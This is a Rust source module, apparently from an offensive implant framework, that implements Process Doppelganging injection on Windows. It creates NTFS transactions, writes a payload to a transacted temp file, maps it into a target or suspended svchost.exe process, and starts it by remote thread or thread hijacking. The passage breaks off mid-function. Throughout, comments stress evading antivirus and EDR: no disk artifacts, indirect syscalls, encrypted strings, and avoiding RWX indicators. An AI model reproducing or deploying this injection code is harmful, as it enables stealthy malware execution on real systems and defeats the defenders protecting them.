//! Process Doppelganging Injection via NTFS Transactions.
//!
//! # Overview
//!
//! This module implements Process Doppelganging — a stealthy injection technique
//! that leverages NTFS transactions to execute code from a file that never exists
//! on disk:
//!
//! 1. Create an NTFS transaction via `NtCreateTransaction`.
//! 2. Create a temporary file **within** the transaction via `NtCreateFile`
//!    (with the transaction handle as `RootDirectory` in `OBJECT_ATTRIBUTES`).
//! 3. Write the payload to the transacted file via `NtWriteFile`.
//! 4. Create a section backed by the transacted file via `NtCreateSection`.
//! 5. **Roll back the transaction** via `NtRollbackTransaction` — the temp file
//!    is deleted from disk but the section mapping persists in memory.
//! 6. Open (or create) the target process.
//! 7. Map the section into the target process via `NtMapViewOfSection`.
//! 8. Execute the payload via a remote thread (`NtCreateThreadEx`).
//!
//! # OPSEC Value
//!
//! - **No disk artifacts**: The transacted file is rolled back before execution,
//!   so no file ever exists on disk. Filesystem forensics find nothing.
//! - **No IAT entries**: All NT API calls go through indirect syscalls via
//!   `syscall!`. No imports from ntdll/kernel32 for injection ops.
//! - **Bypasses file-based AV scanning**: AV scanners check files on disk during
//!   `NtCreateSection`. Because the file is in a transaction, it is invisible to
//!   scanners. After rollback, the section data persists in memory.
//!
//! # Difference from Transacted Hollowing
//!
//! Transacted hollowing (`injection_transacted.rs`) creates a **suspended process**
//! and replaces its image. Doppelganging maps the section directly into an
//! **existing** target process without creating a sacrificial process. The target
//! process must already exist (or be created separately).
//!
//! # Safety
//!
//! All public functions are `unsafe`. They perform raw memory operations and
//! Windows system calls. Must only be called on Windows x86-64.

#![cfg(all(windows, feature = "transacted-hollowing"))]

use std::ffi::c_void;

// ── Constants ────────────────────────────────────────────────────────────────

/// SECTION_ALL_ACCESS.
const SECTION_ALL_ACCESS: u64 = 0x000F_001F;

/// SEC_COMMIT.
const SEC_COMMIT: u64 = 0x0800_0000;

/// PAGE_READWRITE.
const PAGE_READWRITE: u64 = 0x04;

/// PAGE_EXECUTE_READ.
const PAGE_EXECUTE_READ: u64 = 0x20;

/// PAGE_EXECUTE_READ (0x20) and PAGE_READWRITE (0x04) are used for the
/// two-phase mapping (local RW write → target RX execute) instead of
/// PAGE_EXECUTE_READWRITE to avoid the top EDR IoC of an RWX section object.
/// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
const THREAD_INJECT_ACCESS: u64 = 0x1A02;

/// NtCurrentProcess() pseudo-handle.
const CURRENT_PROCESS: u64 = (-1isize) as u64;

/// SYNCHRONIZE access right.
const SYNCHRONIZE: u32 = 0x00100000;

/// STANDARD_RIGHTS_REQUIRED.
const STANDARD_RIGHTS_REQUIRED: u32 = 0x000F0000;

/// TRANSACTION_ALL_ACCESS.
const TRANSACTION_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x3F;

/// FILE_SUPERSEDE — create or supersede the file.
const FILE_SUPERSEDE: u32 = 0x0000_0000;
/// FILE_SYNCHRONOUS_IO_NONALERT — synchronous I/O, non-alertable.
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x0000_0020;
/// FILE_NON_DIRECTORY_FILE — file must not be a directory.
const FILE_NON_DIRECTORY_FILE: u32 = 0x0000_0040;
/// GENERIC_WRITE access right.
const GENERIC_WRITE: u32 = 0x4000_0000;
/// GENERIC_READ access right.
const GENERIC_READ: u32 = 0x8000_0000;
/// FILE_ATTRIBUTE_NORMAL — normal file attributes.
const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
/// OBJ_CASE_INSENSITIVE — case-insensitive object name comparison.
const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;

/// Minimal process access mask for NtOpenProcess.
///
/// PROCESS_VM_WRITE (0x0020) | PROCESS_VM_OPERATION (0x0008) | PROCESS_CREATE_THREAD (0x0002)
///
/// P2-36: PROCESS_CREATE_THREAD was previously missing (was 0x0028).  It is
/// required for NtCreateThreadEx to create a remote thread in the target.
const MINIMAL_PROCESS_ACCESS: u32 = 0x002A;

/// CREATE_SUSPENDED flag for CreateProcessW.
const CREATE_SUSPENDED: u32 = 0x00000004;

/// CONTEXT_FULL flag for GetThreadContext / SetThreadContext.
const CONTEXT_FULL: u32 = 0x0010000B;

// ── pe_resolve helpers ──────────────────────────────────────────────────
use crate::pe_resolve_macros::hash_str_const;

// API name hashes.
const HASH_CREATEPROCESSW: u32 = hash_str_const(b"CreateProcessW\0");
const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");

// Function pointer types.
type FnCreateProcessW = unsafe extern "system" fn(
    *const u16,
    *mut u16,
    *mut c_void,
    *mut c_void,
    i32,
    u32,
    *mut c_void,
    *const u16,
    *mut c_void,
    *mut c_void,
) -> i32;
type FnGetLastError = unsafe extern "system" fn() -> u32;

/// Resolve a function pointer from kernel32.dll.
unsafe fn resolve_kernel32<T>(fn_hash: u32) -> Result<T, String> {
    let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
        .ok_or("kernel32.dll not found in PEB")?;
    let addr =
        pe_resolve::get_proc_address_by_hash(module, fn_hash).ok_or("API not found in kernel32")?;
    Ok(std::mem::transmute_copy(&addr))
}

// ── NT structure definitions (x86-64 layout) ─────────────────────────────────

/// Minimal OBJECT_ATTRIBUTES (x86-64 layout).
#[repr(C)]
struct NtObjAttr {
    length: u32,
    root_directory: usize,
    object_name: usize,
    attributes: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

/// Minimal UNICODE_STRING (x86-64 layout).
#[repr(C)]
struct NtUnicodeStr {
    length: u16,
    maximum_length: u16,
    buffer: usize,
}

/// Minimal IO_STATUS_BLOCK (x86-64 layout).
#[repr(C)]
struct NtIoStatusBlock {
    status: usize,
    information: usize,
}

/// Counter for generating unique temp-file names.
static TEMP_FILE_COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);

// ── Result types ─────────────────────────────────────────────────────────────

/// RAII wrapper for NT handles that calls NtClose on Drop.
pub struct NtHandle(usize);

impl NtHandle {
    /// Create a new RAII handle wrapper. Takes ownership of the raw handle.
    pub fn new(raw: usize) -> Self {
        Self(raw)
    }
    /// Get the raw handle value.
    pub fn raw(&self) -> usize {
        self.0
    }
}

impl Drop for NtHandle {
    fn drop(&mut self) {
        if self.0 != 0 && self.0 != usize::MAX {
            let _ = unsafe { crate::syscalls::syscall_NtClose(self.0 as u64) };
        }
    }
}

/// Result of a successful Process Doppelganging injection.
///
/// Handles are wrapped in `NtHandle` for automatic cleanup on Drop.
pub struct DoppelgangingResult {
    /// Handle to the target process (RAII, auto-closed on Drop).
    pub process_handle: NtHandle,
    /// Handle to the remote thread executing the payload (RAII, auto-closed on Drop).
    pub thread_handle: NtHandle,
    /// PID of the target process.
    pub pid: u32,
}

// ── Page alignment helper ────────────────────────────────────────────────────

fn page_align(size: usize) -> usize {
    let page = 4096;
    ((size + page - 1) / page) * page
}

// ── Transaction helpers ──────────────────────────────────────────────────────

/// Create an NTFS transaction via `NtCreateTransaction`.
///
/// Uses the indirect syscall infrastructure. Falls back to walking ntdll
/// exports for `RtlCreateTransaction` if the SSN cannot be resolved.
///
/// # OPSEC
///
/// The transaction handle is never visible to file-system minifilters that
/// are not enlisted in the transaction. Most AV/EDR file-system minifilters
/// ignore transacted file operations entirely.
unsafe fn create_transaction() -> Result<usize, String> {
    // ── Attempt 1: NtCreateTransaction via indirect syscall ──────────
    let nt_result = try_nt_create_transaction();
    match nt_result {
        Ok(handle) => {
            log::debug!(
                "injection_doppelganging: NtCreateTransaction succeeded, handle={:#x}",
                handle
            );
            return Ok(handle);
        }
        Err(reason) => {
            log::debug!(
                "injection_doppelganging: NtCreateTransaction failed ({}), trying ntdll fallback",
                reason
            );
        }
    }

    // ── Attempt 2: RtlCreateTransaction from ntdll ───────────────────
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(ntdll_base) = ntdll {
        let hash = pe_resolve::hash_str(b"RtlCreateTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            let func: extern "system" fn(*mut c_void, u32, u32, u32, u32, u32, *mut c_void) -> i32 =
                std::mem::transmute(addr);
            let mut tx_handle: usize = 0;
            let ret = func(
                &mut tx_handle as *mut _ as *mut c_void,
                0,                    // lpTransactionAttributes = NULL
                0,                    // dwDesiredAccess = 0
                0,                    // dwIsolationLevel = 0
                0,                    // dwIsolationFlags = 0
                0,                    // dwTimeout = 0 (infinite)
                std::ptr::null_mut(), // dwDescription = NULL
            );
            if ret != 0 && tx_handle != 0 {
                log::debug!(
                    "injection_doppelganging: RtlCreateTransaction fallback succeeded, handle={:#x}",
                    tx_handle
                );
                return Ok(tx_handle);
            }
        }
    }

    Err("could not create NTFS transaction (NtCreateTransaction and RtlCreateTransaction both failed)".to_string())
}

/// Try NtCreateTransaction via the indirect syscall infrastructure.
unsafe fn try_nt_create_transaction() -> Result<usize, String> {
    use crate::syscalls::{do_syscall, get_syscall_id};

    let target = get_syscall_id("NtCreateTransaction").map_err(|e| format!("{}", e))?;

    // NtCreateTransaction(
    //   OUT PHANDLE TransactionHandle,
    //   IN ACCESS_MASK DesiredAccess,
    //   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    //   IN PLARGE_INTEGER Timeout OPTIONAL,
    //   IN ULONG Unknown OPTIONAL,           // reserved, pass 0
    //   IN PUNICODE_STRING Description OPTIONAL,
    //   IN LPGUID Uow OPTIONAL               // unit of work GUID
    // )
    let mut tx_handle: usize = 0;
    let status = do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            &mut tx_handle as *mut _ as u64, // TransactionHandle
            TRANSACTION_ALL_ACCESS as u64,   // DesiredAccess
            0u64,                            // ObjectAttributes = NULL
            0u64,                            // Timeout = NULL
            0u64,                            // Unknown = 0
            0u64,                            // Description = NULL
            0u64,                            // Uow = NULL
        ],
    );

    if status < 0 {
        return Err(format!("NtCreateTransaction returned {:#x}", status as u32));
    }
    if tx_handle == 0 {
        return Err("NtCreateTransaction returned null handle".to_string());
    }
    Ok(tx_handle)
}

/// Roll back an NTFS transaction.
///
/// After rollback, all file operations within the transaction are undone —
/// files created within it are deleted from disk. Section mappings backed by
/// those files persist in memory.
unsafe fn rollback_transaction(tx_handle: usize) -> Result<(), String> {
    // ── Attempt 1: NtRollbackTransaction via indirect syscall ────────
    if let Ok(target) = crate::syscalls::get_syscall_id("NtRollbackTransaction") {
        let status = crate::syscalls::do_syscall(
            target.ssn,
            target.gadget_addr,
            &[
                tx_handle as u64, // TransactionHandle
                1u64,             // Wait = TRUE
            ],
        );
        if status >= 0 {
            log::debug!("injection_doppelganging: NtRollbackTransaction succeeded");
            return Ok(());
        }
        log::debug!(
            "injection_doppelganging: NtRollbackTransaction failed ({:#x}), trying fallback",
            status as u32
        );
    }

    // ── Attempt 2: RtlRollbackTransaction from ntdll ─────────────────
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL);
    if let Some(ntdll_base) = ntdll {
        let hash = pe_resolve::hash_str(b"RtlRollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll_base, hash) {
            let func: extern "system" fn(usize, i32) -> i32 = std::mem::transmute(addr);
            let status = func(tx_handle, 1);
            if status >= 0 {
                log::debug!("injection_doppelganging: RtlRollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    // ── Attempt 3: RollbackTransaction from kernel32 ─────────────────
    let k32_hash = pe_resolve::hash_str(b"kernel32.dll\0");
    if let Some(k32) = pe_resolve::get_module_handle_by_hash(k32_hash) {
        let hash = pe_resolve::hash_str(b"RollbackTransaction\0");
        if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, hash) {
            let func: extern "system" fn(usize) -> i32 = std::mem::transmute(addr);
            let ret = func(tx_handle);
            if ret != 0 {
                log::debug!("injection_doppelganging: kernel32 RollbackTransaction succeeded");
                return Ok(());
            }
        }
    }

    Err("all rollback methods failed".to_string())
}

// ── Transacted file helpers ──────────────────────────────────────────────────

/// Create a temporary file within an NTFS transaction.
///
/// Builds an NT path (`\??\C:\Windows\Temp\~dpgXXXX.tmp`) and sets
/// `OBJECT_ATTRIBUTES.RootDirectory = tx_handle` to associate the file with
/// the transaction.
///
/// # OPSEC
///
/// The file is created within the transaction and is invisible to non-enlisted
/// file-system minifilters. After rollback, the file is deleted from disk
/// entirely — no forensic artifacts remain.
unsafe fn create_transacted_file(tx_handle: usize, payload_size: usize) -> Result<usize, String> {
    let aligned_size = page_align(payload_size);

    // ── Build temp file NT path ──────────────────────────────────────
    // Path: \??\C:\Windows\Temp\~dpgXXXX.tmp  (randomised suffix)
    let base_path =
        String::from_utf8_lossy(&string_crypt::enc_str!("\\??\\C:\\Windows\\Temp\\~dpg"))
            .trim_end_matches('\0')
            .to_string();

    let counter = TEMP_FILE_COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    let suffix = format!("{:04x}", counter & 0xFFFF);
    let full_path_str = format!("{}{}.tmp\0", base_path, suffix);
    let full_path: Vec<u16> = full_path_str.encode_utf16().collect();

    // Build UNICODE_STRING for the file path.
    let byte_len = (full_path.len() - 1) * 2; // exclude trailing null
    let mut uni_name = NtUnicodeStr {
        length: byte_len as u16,
        maximum_length: (byte_len + 2) as u16,
        buffer: full_path.as_ptr() as usize,
    };

    // Build OBJECT_ATTRIBUTES with RootDirectory = tx_handle.
    // This is the key to associating the file with the transaction.
    let mut oa = NtObjAttr {
        length: std::mem::size_of::<NtObjAttr>() as u32,
        root_directory: tx_handle,
        object_name: &mut uni_name as *mut _ as usize,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };

    // ── Create the temp file within the transaction ──────────────────
    let mut file_handle: usize = 0;
    let mut iosb = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    // DesiredAccess: GENERIC_WRITE | SYNCHRONIZE
    // CreateDisposition: FILE_SUPERSEDE
    // CreateOptions: FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    let create_file_status = crate::syscall!(
        "NtCreateFile",
        &mut file_handle as *mut _ as u64,    // FileHandle
        (GENERIC_WRITE | SYNCHRONIZE) as u64, // DesiredAccess
        &mut oa as *mut _ as u64,             // ObjectAttributes
        &mut iosb as *mut _ as u64,           // IoStatusBlock
        0u64,                                 // AllocationSize = NULL
        FILE_ATTRIBUTE_NORMAL as u64,         // FileAttributes
        0u64,                                 // ShareAccess = none
        FILE_SUPERSEDE as u64,                // CreateDisposition
        (FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE) as u64, // CreateOptions
        0u64,                                 // EaLength = 0
        0u64,                                 // EaBuffer = NULL
    );

    if create_file_status.as_ref().map_or(true, |s| *s < 0) || file_handle == 0 {
        return Err(format!(
            "NtCreateFile for transacted temp file failed: status={:?}",
            create_file_status
        ));
    }

    log::debug!(
        "injection_doppelganging: created transacted temp file handle={:#x}",
        file_handle
    );

    // ── Write placeholder data to the file ───────────────────────────
    // The file needs to be at least `aligned_size` so the section can map it.
    let zero_buf = vec![0u8; aligned_size];
    let mut iosb2 = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    let write_status = crate::syscall!(
        "NtWriteFile",
        file_handle as u64,          // FileHandle
        0u64,                        // Event = NULL
        0u64,                        // ApcRoutine = NULL
        0u64,                        // ApcContext = NULL
        &mut iosb2 as *mut _ as u64, // IoStatusBlock
        zero_buf.as_ptr() as u64,    // Buffer
        zero_buf.len() as u64,       // Length
        0u64,                        // ByteOffset = NULL
        0u64,                        // Key = NULL
    );

    if write_status.as_ref().map_or(true, |s| *s < 0) {
        let _ = crate::syscall!("NtClose", file_handle as u64);
        return Err(format!(
            "NtWriteFile for transacted temp file failed: status={:?}",
            write_status
        ));
    }

    log::debug!(
        "injection_doppelganging: wrote {} placeholder bytes to transacted file",
        aligned_size
    );

    Ok(file_handle)
}

/// Write the payload to a transacted file via `NtWriteFile`.
///
/// # OPSEC
///
/// The write goes through an indirect syscall — no IAT entry for WriteFile
/// or NtWriteFile. The data is written to a transacted file that will be
/// rolled back before the payload executes.
unsafe fn write_payload_to_file(file_handle: usize, payload: &[u8]) -> Result<(), String> {
    let mut iosb = NtIoStatusBlock {
        status: 0,
        information: 0,
    };

    // Write payload starting at offset 0 (overwriting the placeholder zeros).
    let mut byte_offset: i64 = 0;
    let write_status = crate::syscall!(
        "NtWriteFile",
        file_handle as u64,                // FileHandle
        0u64,                              // Event = NULL
        0u64,                              // ApcRoutine = NULL
        0u64,                              // ApcContext = NULL
        &mut iosb as *mut _ as u64,        // IoStatusBlock
        payload.as_ptr() as u64,           // Buffer
        payload.len() as u64,              // Length
        &mut byte_offset as *mut _ as u64, // ByteOffset = 0
        0u64,                              // Key = NULL
    );

    if write_status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!(
            "NtWriteFile for payload failed: status={:?}",
            write_status
        ));
    }

    log::debug!(
        "injection_doppelganging: wrote {} payload bytes to transacted file",
        payload.len()
    );
    Ok(())
}

// ── Section helpers ──────────────────────────────────────────────────────────

/// Create a section backed by a file handle via `NtCreateSection`.
///
/// After this call the section object holds a reference to the file data.
/// Closing the file handle does not invalidate the section.
unsafe fn create_section_from_file(
    file_handle: usize,
    payload_size: usize,
) -> Result<usize, String> {
    let aligned_size = page_align(payload_size);
    let mut large_size: i64 = aligned_size as i64;
    let mut h_section: usize = 0;

    // SectionPageProtection = PAGE_READWRITE.  The payload is written via a
    // local RW mapping (write_payload_to_section), then mapped into the target
    // as PAGE_EXECUTE_READ (map_section_to_process).  Using PAGE_READWRITE here
    // avoids creating an RWX-backed section object — the single most suspicious
    // NtCreateSection argument for doppelganging detection.  The section object's
    // maximum protection allows both RW and RX views.
    let status = crate::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,  // SectionHandle
        SECTION_ALL_ACCESS,               // DesiredAccess
        0u64,                             // ObjectAttributes = NULL
        &mut large_size as *mut _ as u64, // MaximumSize
        PAGE_READWRITE,                   // SectionPageProtection
        SEC_COMMIT,                       // AllocationAttributes
        file_handle as u64,               // FileHandle (transacted file)
    );

    if status.as_ref().map_or(true, |s| *s < 0) || h_section == 0 {
        return Err(format!(
            "NtCreateSection for doppelganging section failed: status={:?}",
            status
        ));
    }

    log::debug!(
        "injection_doppelganging: created section handle={:#x}, size={}",
        h_section,
        aligned_size
    );
    Ok(h_section)
}

/// Write payload into a section by mapping it locally with RW, copying, and unmapping.
unsafe fn write_payload_to_section(h_section: usize, payload: &[u8]) -> Result<(), String> {
    let mut local_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = crate::syscall!(
        "NtMapViewOfSection",
        h_section as u64,
        CURRENT_PROCESS, // NtCurrentProcess()
        &mut local_base as *mut _ as u64,
        0u64, // ZeroBits
        0u64, // CommitSize
        0u64, // SectionOffset = NULL
        &mut view_size as *mut _ as u64,
        2u64, // ViewUnmap
        0u64, // AllocationType
        PAGE_READWRITE,
    );

    if map_status.as_ref().map_or(true, |s| *s < 0) || local_base.is_null() {
        return Err(format!(
            "NtMapViewOfSection(local RW) failed: status={:?}",
            map_status
        ));
    }

    // Write payload into local mapping.
    std::ptr::copy_nonoverlapping(payload.as_ptr(), local_base as *mut u8, payload.len());

    // Unmap from our process — the section object retains the data.
    let _ = crate::syscall!("NtUnmapViewOfSection", CURRENT_PROCESS, local_base as u64,);

    log::debug!(
        "injection_doppelganging: wrote {} bytes to section",
        payload.len()
    );
    Ok(())
}

/// Map a section into the target process with `PAGE_EXECUTE_READ`.
///
/// # OPSEC
///
/// The section is mapped as executable-but-not-writable. EDR scanners that
/// check for RWX pages will not flag it. The data came from a transacted file
/// that no longer exists on disk.
unsafe fn map_section_to_process(
    section_handle: usize,
    process_handle: usize,
) -> Result<usize, String> {
    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut view_size: usize = 0;

    let map_status = crate::syscall!(
        "NtMapViewOfSection",
        section_handle as u64,
        process_handle as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        0u64,
        0u64,
        &mut view_size as *mut _ as u64,
        2u64, // ViewUnmap
        0u64,
        PAGE_EXECUTE_READ,
    );

    if map_status.as_ref().map_or(true, |s| *s < 0) || remote_base.is_null() {
        return Err(format!(
            "NtMapViewOfSection(remote RX) failed: status={:?}",
            map_status
        ));
    }

    log::debug!(
        "injection_doppelganging: mapped section into target at {:#x}",
        remote_base as usize
    );
    Ok(remote_base as usize)
}

// ── Process / thread helpers ─────────────────────────────────────────────────

/// Find a process by image name using `NtQuerySystemInformation`.
///
/// Enumerates all running processes and returns the PID of the first match
/// (case-insensitive). Uses indirect syscalls — no IAT entries.
///
/// # Safety
///
/// Must be called on Windows x86-64. The SYSTEM_PROCESS_INFORMATION layout
/// offsets (0x30, 0x38, 0x40) are specific to x64 Windows.
unsafe fn find_process_by_name(name: &str) -> Result<u32, String> {
    let mut buf_size: usize = 0;

    // First call to get required buffer size (will return STATUS_INFO_LENGTH_MISMATCH).
    let _ = crate::syscall!(
        "NtQuerySystemInformation",
        5u64,                           // SystemProcessInformation
        0u64,                           // null buffer
        0u64,                           // zero size
        &mut buf_size as *mut _ as u64, // ReturnLength
    );

    // Allocate buffer. May need multiple tries as the process list can change
    // between the size query and the actual enumeration.
    let mut buffer: Vec<u8> = Vec::new();
    let mut return_length: usize = 0;
    for _ in 0..3 {
        buffer.resize(buf_size + 4096, 0);
        let status = crate::syscall!(
            "NtQuerySystemInformation",
            5u64,                                // SystemProcessInformation
            buffer.as_mut_ptr() as u64,          // Buffer
            buffer.len() as u64,                 // BufferSize
            &mut return_length as *mut _ as u64, // ReturnLength
        );
        if status.is_ok() && status.as_ref().unwrap() >= &0 {
            break;
        }
        buf_size = return_length;
    }

    // Walk the SYSTEM_PROCESS_INFORMATION linked list.
    // Offsets are for x64 Windows:
    //   0x00: NextEntryOffset (u32)
    //   0x30: ImageName.Buffer    (*const u16)
    //   0x38: ImageName.Length    (u16)
    //   0x40: UniqueProcessId     (u32)
    let mut offset = 0usize;
    loop {
        if offset + 0x48 > buffer.len() {
            break;
        }
        let entry_ptr = buffer[offset..].as_ptr();
        let next_entry_offset = *(entry_ptr as *const u32) as usize;
        // UniqueProcessId at offset 0x40
        let pid = *((entry_ptr as *const u8).add(0x40) as *const u32);
        // ImageName.Length at offset 0x38 (in bytes, not characters)
        let name_len = *((entry_ptr as *const u8).add(0x38) as *const u16) as usize;
        // ImageName.Buffer at offset 0x30
        let name_ptr = *((entry_ptr as *const u8).add(0x30) as *const *const u16);

        // ImageName.Buffer can be NULL for the System Idle Process (PID 0).
        if !name_ptr.is_null() && name_len > 0 {
            let char_count = name_len / 2;
            let name_slice = std::slice::from_raw_parts(name_ptr, char_count);
            let proc_name = String::from_utf16_lossy(name_slice);
            if proc_name.eq_ignore_ascii_case(name) {
                return Ok(pid);
            }
        }

        if next_entry_offset == 0 {
            break;
        }
        offset += next_entry_offset;
    }

    Err(format!("Process '{}' not found", name))
}

/// Open an existing process by PID via `NtOpenProcess`.
unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;

    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let status = crate::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        MINIMAL_PROCESS_ACCESS as u64,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if status.as_ref().map_or(true, |s| *s < 0) || h_proc == 0 {
        return Err(format!(
            "NtOpenProcess({}) failed: status={:?}",
            pid, status
        ));
    }

    log::debug!(
        "injection_doppelganging: opened target process pid={}, handle={:#x}",
        pid,
        h_proc
    );
    Ok(h_proc)
}

/// Create a new suspended process and return its handles.
///
/// Used when no target process is specified. The process is created in a
/// suspended state so we can inject before any legitimate code runs.
///
/// # EDR Hook Risk (P2-24)
///
/// This function resolves `CreateProcessW` from kernel32 via `pe_resolve`
/// (no static IAT entry), but `kernel32!CreateProcessW` is a common EDR
/// hook target.  Many EDR products place inline hooks on this function to
/// intercept process creation for behavioural analysis.
///
/// A more OPSEC-safe approach would be to use `NtCreateUserProcess` via
/// indirect syscall (resolved from a clean ntdll mapping), which bypasses
/// kernel32 hooks entirely.  That is a larger refactoring effort because
/// `NtCreateUserProcess` requires manually constructing the `RTL_USER_PROCESS_PARAMETERS`
/// and `PS_CREATE_INFO` structures that `CreateProcessW` normally handles.
///
/// For now, the `pe_resolve` approach is acceptable — it avoids IAT entries
/// and works against hook implementations that only check the IAT.  Full
/// `NtCreateUserProcess` support should be considered for a future hardening
/// pass.
unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
    use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};

    let create_proc_w: FnCreateProcessW = unsafe { resolve_kernel32(HASH_CREATEPROCESSW)? };
    let get_last_error: FnGetLastError = unsafe { resolve_kernel32(HASH_GETLASTERROR)? };

    // Use svchost.exe as the sacrificial process — it's ubiquitous on Windows
    // and its presence does not raise suspicion.
    let path = string_crypt::enc_str!(r"C:\Windows\System32\svchost.exe");
    let path_u16: Vec<u16> = path
        .iter()
        .take_while(|&&b| b != 0)
        .map(|&b| b as u16)
        .chain(std::iter::once(0))
        .collect();

    let mut startup_info: STARTUPINFOW = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();

    let success = create_proc_w(
        path_u16.as_ptr() as *const u16,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        0,                       // bInheritHandles = FALSE
        CREATE_SUSPENDED as u32, // dwCreationFlags
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut startup_info as *mut _ as *mut c_void,
        &mut proc_info as *mut _ as *mut c_void,
    );

    if success == 0 {
        return Err(format!(
            "CreateProcessW failed for suspended process (error: {})",
            unsafe { get_last_error() }
        ));
    }

    let pid = proc_info.dw_process_id;
    let process_handle = proc_info.h_process as usize;
    let thread_handle = proc_info.h_thread as usize;

    log::debug!(
        "injection_doppelganging: created suspended process pid={}",
        pid
    );
    Ok((process_handle, thread_handle, pid))
}

/// Create a remote thread in the target process via `NtCreateThreadEx`.
///
/// # OPSEC
///
/// Uses indirect syscall rather than CreateRemoteThread, avoiding IAT entries
/// for thread-creation APIs. EDR hooks on CreateRemoteThread are bypassed.
unsafe fn execute_payload(process_handle: usize, entry_point: usize) -> Result<usize, String> {
    let mut thread_handle: usize = 0;

    // NtCreateThreadEx(
    //   OUT PHANDLE ThreadHandle,
    //   IN ACCESS_MASK DesiredAccess,
    //   IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    //   IN HANDLE ProcessHandle,
    //   IN PVOID StartRoutine,
    //   IN PVOID Argument OPTIONAL,
    //   IN ULONG CreateFlags,
    //   IN SIZE_T ZeroBits,
    //   IN SIZE_T StackSize,
    //   IN SIZE_T MaximumStackSize,
    //   IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
    // )
    let status = crate::syscall!(
        "NtCreateThreadEx",
        &mut thread_handle as *mut _ as u64, // ThreadHandle
        THREAD_INJECT_ACCESS,                // DesiredAccess (minimal)
        0u64,                                // ObjectAttributes = NULL
        process_handle as u64,               // ProcessHandle
        entry_point as u64,                  // StartRoutine
        0u64,                                // Argument = NULL
        0u64,                                // CreateFlags = 0 (run immediately)
        0u64,                                // ZeroBits
        0u64,                                // StackSize
        0u64,                                // MaximumStackSize
        0u64,                                // AttributeList = NULL
    );

    if status.as_ref().map_or(true, |s| *s < 0) || thread_handle == 0 {
        return Err(format!("NtCreateThreadEx failed: status={:?}", status));
    }

    log::debug!(
        "injection_doppelganging: created remote thread handle={:#x} at entry={:#x}",
        thread_handle,
        entry_point
    );
    Ok(thread_handle)
}

/// Redirect a suspended thread's RIP to the payload address.
///
/// Uses `NtGetContextThread` / `NtSetContextThread` via indirect syscall
/// instead of kernel32 `GetThreadContext` / `SetThreadContext` to avoid
/// EDR hooks on those common interception points (P2-25).
///
/// P2-37: Uses `crate::win_types::CONTEXT`, a local `#[repr(C)]` struct
/// matching the Windows x86_64 CONTEXT layout.  No winapi dependency —
/// avoids pulling winapi::um::winnt::CONTEXT which would create linker
/// dependencies on the winapi crate's advapi32/kernel32 stubs.
unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
    use crate::win_types::CONTEXT;

    let mut ctx: CONTEXT = std::mem::zeroed();
    ctx.context_flags = crate::win_types::CONTEXT_FULL;

    // NtGetContextThread(ThreadHandle, pContext)
    let status = crate::syscall!(
        "NtGetContextThread",
        thread_handle as u64,
        &mut ctx as *mut CONTEXT as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!("NtGetContextThread failed: status={:?}", status));
    }

    ctx.rip = payload_addr as u64;

    // NtSetContextThread(ThreadHandle, pContext)
    let status = crate::syscall!(
        "NtSetContextThread",
        thread_handle as u64,
        &ctx as *const CONTEXT as u64,
    );
    if status.as_ref().map_or(true, |s| *s < 0) {
        return Err(format!("NtSetContextThread failed: status={:?}", status));
    }

    log::debug!(
        "injection_doppelganging: redirected thread RIP to {:#x}",
        payload_addr
    );
    Ok(())
}

/// Resume a suspended thread via `NtResumeThread`.
unsafe fn resume_thread(thread_handle: usize) -> Result<(), String> {
    let status = crate::syscall!(
        "NtResumeThread",
        thread_handle as u64,
